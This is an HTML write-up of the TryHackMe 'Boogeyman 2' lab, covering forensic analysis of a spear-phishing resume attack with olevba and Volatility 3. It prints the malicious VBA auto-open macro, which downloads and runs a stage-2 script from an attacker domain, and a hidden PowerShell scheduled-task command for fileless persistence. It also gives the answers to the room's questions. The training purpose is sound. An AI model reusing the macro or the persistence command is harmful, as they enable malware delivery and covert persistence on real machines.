<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boogeyman 2 - Advanced Spear Phishing Analysis | Tuned for Security</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .code-block {
            background: #1f2937;
            color: #f9fafb;
            border-radius: 0.5rem;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.875rem;
            margin: 1rem 0;
        }
        .highlight {
            background: #fef3c7;
            padding: 0.125rem 0.25rem;
            border-radius: 0.25rem;
        }
    </style>
</head>
<body class="bg-gray-50 text-gray-800 font-sans">

    <nav class="sticky top-0 z-50 bg-white bg-opacity-90 backdrop-filter backdrop-blur-lg shadow-md">
        <div class="container mx-auto px-6 py-4 flex justify-start items-center">
            <a href="../index.html" class="text-2xl font-bold text-gray-800 transition duration-300 hover:text-gray-600">← Back to Portfolio</a>
        </div>
    </nav>

    <main class="container mx-auto px-6 py-16">
        <article class="bg-white p-8 rounded-lg shadow-xl max-w-6xl mx-auto">
            
            <!-- Header -->
            <div class="text-center mb-12">
                <h1 class="text-4xl md:text-5xl font-extrabold text-gray-900 mb-4">Boogeyman 2 - TryHackMe Writeup</h1>
                <h2 class="text-xl md:text-2xl font-semibold text-gray-600 mb-6">Advanced Spear Phishing & Memory Forensics</h2>
                <div class="flex flex-wrap justify-center gap-2 mb-6">
                    <span class="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm font-semibold">Memory Forensics</span>
                    <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">Macro Analysis</span>
                    <span class="bg-purple-100 text-purple-800 px-3 py-1 rounded-full text-sm font-semibold">Process Investigation</span>
                    <span class="bg-red-100 text-red-800 px-3 py-1 rounded-full text-sm font-semibold">Network Analysis</span>
                    <span class="bg-yellow-100 text-yellow-800 px-3 py-1 rounded-full text-sm font-semibold">Persistence Analysis</span>
                </div>
                <p class="text-gray-600">Published: September 2025 • Estimated reading time: 20 minutes</p>
            </div>

            <!-- Overview Section -->
            <div class="bg-gray-100 p-6 rounded-lg mb-8">
                <h2 class="text-2xl font-bold text-gray-800 mb-4">Overview</h2>
                <div class="grid md:grid-cols-2 gap-6">
                    <div>
                        <ul class="space-y-2 text-gray-700">
                            <li><strong>Difficulty:</strong> Medium</li>
                            <li><strong>Skills Practiced:</strong> Memory Forensics, Malicious Macro Analysis, Process Investigation, Network Traffic Analysis</li>
                            <li><strong>Tools Used:</strong> Volatility 3, olevba, Evolution/Thunderbird</li>
                            <li><strong>Time Investment:</strong> 1.5-2 hours</li>
                        </ul>
                    </div>
                    <div>
                        <p class="text-gray-700"><strong>Career Relevance:</strong> Advanced SOC analyst skills focusing on sophisticated spear phishing attacks against HR departments. This room demonstrates comprehensive incident response capabilities including memory forensics, process tree analysis, and persistence mechanism identification - critical skills for senior security roles.</p>
                    </div>
                </div>
            </div>

            <!-- Learning Objectives -->
            <div class="mb-8">
                <h2 class="text-2xl font-bold text-gray-800 mb-4">Learning Objectives</h2>
                <p class="text-gray-700 leading-relaxed">
                    This room presents a sophisticated spear phishing attack targeting Quick Logistics LLC's Human Resources department. The scenario demonstrates advanced adversarial techniques including weaponized Office macros, multi-stage payload delivery, memory-resident operations, and persistence mechanisms. This investigation showcases essential skills for detecting and analyzing advanced persistent threats (APTs) in enterprise environments.
                </p>
            </div>

            <!-- Task 1 -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Task 1: Investigation Setup</h2>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                    <h3 class="font-semibold text-blue-800 mb-2">Objective</h3>
                    <p class="text-blue-700">Understand the attack scenario and prepare investigation environment</p>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Scenario Analysis</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    The Boogeyman threat group has returned with improved tactics, targeting Maxine Beck, a Human Resource Specialist at Quick Logistics LLC. The attack vector is a weaponized resume document sent as part of a job application, demonstrating a sophisticated social engineering approach that leverages the target's professional responsibilities.
                </p>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Available Artifacts</h4>
                <ul class="list-disc list-inside space-y-2 text-gray-700 mb-4">
                    <li>Phishing email with malicious Word document attachment</li>
                    <li>Memory dump (WKSTN-2961.raw) from the compromised workstation</li>
                    <li>Volatility 3 framework for memory forensics analysis</li>
                    <li>Olevba tool for macro analysis</li>
                </ul>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Learning</h4>
                <p class="text-gray-700 leading-relaxed">
                    Understanding the complete attack lifecycle from initial access through persistence is essential for comprehensive incident response and threat hunting operations.
                </p>
            </div>

            <!-- Task 2 -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Task 2: Comprehensive Spear Phishing Analysis</h2>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                    <h3 class="font-semibold text-blue-800 mb-2">Objective</h3>
                    <p class="text-blue-700">Analyze the spear phishing attack, extract the payload, and trace the complete attack progression through memory forensics</p>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Phase 1: Email and Document Analysis</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    Analyzed the spear phishing email using Evolution mail client to identify the attack vector and extract the malicious attachment.
                </p>

                <div class="code-block">
# Email Analysis Results
From: westaylor23@outlook.com
To: maxine.beck@quicklogisticsorg.onmicrosoft.com
Subject: Resume - Application for Junior IT Analyst Role
Attachment: Resume_WesleyTaylor.doc

# Hash verification
$ md5sum Resume_WesleyTaylor.doc
52c4384a0b9e248b95804352ebec6c5b  Resume_WesleyTaylor.doc
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Phase 2: Malicious Macro Analysis</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    Used olevba to extract and analyze the VBA macro embedded in the weaponized document, revealing the multi-stage attack mechanism.
                </p>

                <div class="code-block">
# VBA Macro Analysis
$ olevba Resume_WesleyTaylor.doc

Sub AutoOpen()
    spath = "C:\ProgramData\"
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
    xHttp.Send
    With bStrm
        .Type = 1
        .Open
        .write xHttp.responseBody
        .savetofile spath & "\update.js", 2
    End With
    
    Set shell_object = CreateObject("WScript.Shell")
    shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
End Sub
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Phase 3: Memory Forensics Investigation</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    Conducted comprehensive memory analysis using Volatility 3 to trace the attack progression and identify malicious processes.
                </p>

                <div class="space-y-6">
                    <div class="bg-gray-50 border-l-4 border-gray-500 p-4">
                        <h5 class="font-semibold text-gray-800 mb-2">1. System Profile Identification</h5>
                        <div class="code-block">
$ vol -f WKSTN-2961.raw windows.info.Info

# System Details:
# OS: Windows 10 (64-bit)
# System Time: 2023-08-21 14:14:28
# Processors: 2
                        </div>
                    </div>

                    <div class="bg-red-50 border-l-4 border-red-500 p-4">
                        <h5 class="font-semibold text-red-800 mb-2">2. Malicious Process Tree Analysis</h5>
                        <div class="code-block">
$ vol -f WKSTN-2961.raw windows.pslist.PsList

# Attack Chain Identified:
WINWORD.EXE (PID 1124) → wscript.exe (PID 4260) → updater.exe (PID 6216)

# Process Details:
# - WINWORD.EXE: Victim opened malicious document
# - wscript.exe: Executed stage 2 payload (update.js) 
# - updater.exe: Final malicious binary with C2 capabilities
                        </div>
                        <p class="text-red-700 mt-2">This process tree clearly shows the attack progression from document execution to payload deployment.</p>
                    </div>

                    <div class="bg-orange-50 border-l-4 border-orange-500 p-4">
                        <h5 class="font-semibold text-orange-800 mb-2">3. Network Communication Analysis</h5>
                        <div class="code-block">
$ vol -f WKSTN-2961.raw windows.netscan.NetScan

# C2 Connection Identified:
PID 6216 (updater.exe): 10.10.49.181:63350 → 128.199.95.189:8080
Status: CLOSED (captured after communication)
Timestamp: 2023-08-21 14:16:11
                        </div>
                        <p class="text-orange-700 mt-2">The malware established communication with its C2 server shortly after execution.</p>
                    </div>

                    <div class="bg-purple-50 border-l-4 border-purple-500 p-4">
                        <h5 class="font-semibold text-purple-800 mb-2">4. Persistence Mechanism Discovery</h5>
                        <div class="code-block">
# Advanced strings analysis revealed scheduled task creation:
$ strings WKSTN-2961.raw | grep -i 'schtasks'

# Persistence Command Identified:
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""'
                        </div>
                        <p class="text-purple-700 mt-2">Sophisticated persistence using PowerShell and registry-stored Base64 encoded payload.</p>
                    </div>

                    <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4">
                        <h5 class="font-semibold text-yellow-800 mb-2">5. File System Artifacts</h5>
                        <div class="code-block">
$ vol -f WKSTN-2961.raw windows.filescan.FileScan | grep '.doc'

# Original Email Attachment Location:
C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc

# Malicious Payload Locations:
# - C:\ProgramData\update.js (Stage 2 script)
# - C:\Windows\Tasks\updater.exe (Final payload)
                        </div>
                    </div>
                </div>

                <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-4">
                    <h4 class="font-semibold text-green-800 mb-2">Task 2 Answers</h4>
                    <ul class="space-y-1 text-green-700 text-sm">
                        <li><strong>What email was used to send the phishing email?</strong> <span class="highlight">westaylor23@outlook.com</span></li>
                        <li><strong>What is the email of the victim employee?</strong> <span class="highlight">maxine.beck@quicklogisticsorg.onmicrosoft.com</span></li>
                        <li><strong>What is the name of the attached malicious document?</strong> <span class="highlight">Resume_WesleyTaylor.doc</span></li>
                        <li><strong>What is the MD5 hash of the malicious attachment?</strong> <span class="highlight">52c4384a0b9e248b95804352ebec6c5b</span></li>
                        <li><strong>What URL is used to download the stage 2 payload based on the document's macro?</strong> <span class="highlight">https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png</span></li>
                        <li><strong>What is the name of the process that executed the newly downloaded stage 2 payload?</strong> <span class="highlight">wscript.exe</span></li>
                        <li><strong>What is the full file path of the malicious stage 2 payload?</strong> <span class="highlight">C:\ProgramData\update.js</span></li>
                        <li><strong>What is the PID of the process that executed the stage 2 payload?</strong> <span class="highlight">4260</span></li>
                        <li><strong>What is the parent PID of the process that executed the stage 2 payload?</strong> <span class="highlight">1124</span></li>
                        <li><strong>What URL is used to download the malicious binary executed by the stage 2 payload?</strong> <span class="highlight">https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe</span></li>
                        <li><strong>What is the PID of the malicious process used to establish the C2 connection?</strong> <span class="highlight">6216</span></li>
                        <li><strong>What is the full file path of the malicious process used to establish the C2 connection?</strong> <span class="highlight">C:\Windows\Tasks\updater.exe</span></li>
                        <li><strong>What is the IP address and port of the C2 connection initiated by the malicious binary?</strong> <span class="highlight">128.199.95.189:8080</span></li>
                        <li><strong>What is the full file path of the malicious email attachment based on the memory dump?</strong> <span class="highlight">C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc</span></li>
                        <li><strong>The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?</strong> <span class="highlight">schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""'</span></li>
                    </ul>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Learning</h4>
                <p class="text-gray-700 leading-relaxed">
                    This investigation demonstrates the complete forensic analysis workflow from initial email investigation through advanced memory forensics, showcasing the complexity of modern spear phishing attacks and the comprehensive skills required for effective incident response.
                </p>
            </div>

            <!-- Overall Analysis -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Advanced Attack Analysis</h2>
                
                <h3 class="text-xl font-semibold text-gray-700 mb-3">Attack Progression Timeline</h3>
                <ol class="list-decimal list-inside space-y-3 text-gray-700 mb-6">
                    <li><strong>Initial Access:</strong> Spear phishing email with weaponized resume document targeting HR specialist</li>
                    <li><strong>Execution:</strong> VBA macro auto-executes when document is opened, downloading stage 2 payload</li>
                    <li><strong>Payload Deployment:</strong> JavaScript file executed via wscript.exe, downloading final malicious binary</li>
                    <li><strong>Command & Control:</strong> updater.exe establishes C2 communication with external server</li>
                    <li><strong>Persistence:</strong> Scheduled task created using PowerShell with registry-stored encoded payload</li>
                </ol>

                <h3 class="text-xl font-semibold text-gray-700 mb-3">Advanced Techniques Observed</h3>
                <div class="bg-gradient-to-r from-red-50 to-orange-50 p-6 rounded-lg mb-6">
                    <ul class="space-y-2 text-gray-700">
                        <li><strong>Social Engineering:</strong> Job application theme targeting HR department responsibilities</li>
                        <li><strong>Multi-Stage Payload:</strong> Document → JavaScript → Final executable to evade detection</li>
                        <li><strong>File Disguise:</strong> Payload downloaded as .png file but saved as .js script</li>
                        <li><strong>Registry Persistence:</strong> Base64-encoded PowerShell payload stored in registry</li>
                        <li><strong>Process Hollowing Indicators:</strong> Multiple file system locations for the same binary</li>
                    </ul>
                </div>

                <h3 class="text-xl font-semibold text-gray-700 mb-3">Persistence Analysis Deep Dive</h3>
                <p class="text-gray-700 leading-relaxed mb-4">
                    The discovered persistence mechanism demonstrates sophisticated adversarial techniques:
                </p>
                <div class="code-block">
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""'
                </div>
                <p class="text-gray-700 leading-relaxed">
                    This command creates a daily scheduled task that executes a PowerShell command to retrieve, decode, and execute Base64-encoded data from the Windows registry - a fileless persistence technique that's difficult to detect with traditional antivirus solutions.
                </p>
            </div>

            <!-- Key Tools & Career Application -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Key Tools & Career Application</h2>
                
                <div class="bg-gradient-to-r from-blue-50 to-purple-50 p-6 rounded-lg mb-6">
                    <h3 class="text-xl font-bold text-gray-700 mb-3">Tools Demonstrated</h3>
                    <p class="text-gray-700 leading-relaxed">
                        <strong>Investigation:</strong> Volatility 3, olevba, Evolution/Thunderbird, strings<br>
                        <strong>Techniques:</strong> Memory forensics, macro analysis, process tree investigation, network connection analysis, persistence mechanism identification
                    </p>
                </div>

                <div class="bg-gradient-to-r from-green-50 to-blue-50 p-6 rounded-lg">
                    <h3 class="text-xl font-bold text-gray-700 mb-3">SOC Analyst Relevance</h3>
                    <p class="text-gray-700 leading-relaxed mb-4">
                        This scenario demonstrates advanced incident response capabilities including memory forensics, sophisticated malware analysis, and persistence mechanism identification - core skills for senior threat detection and response roles.
                    </p>
                    <div class="grid md:grid-cols-2 gap-4">
                        <ul class="space-y-2 text-gray-700">
                            <li><strong>Memory Forensics:</strong> Volatility-based investigation for process analysis</li>
                            <li><strong>Advanced Malware Analysis:</strong> Multi-stage payload investigation</li>
                            <li><strong>Spear Phishing Analysis:</strong> HR-targeted social engineering detection</li>
                        </ul>
                        <ul class="space-y-2 text-gray-700">
                            <li><strong>Persistence Analysis:</strong> Registry-based backdoor identification</li>
                            <li><strong>Network Investigation:</strong> C2 communication pattern analysis</li>
                            <li><strong>Incident Documentation:</strong> Comprehensive forensic reporting</li>
                        </ul>
                    </div>
                </div>
            </div>

        </article>
    </main>

</body>
</html>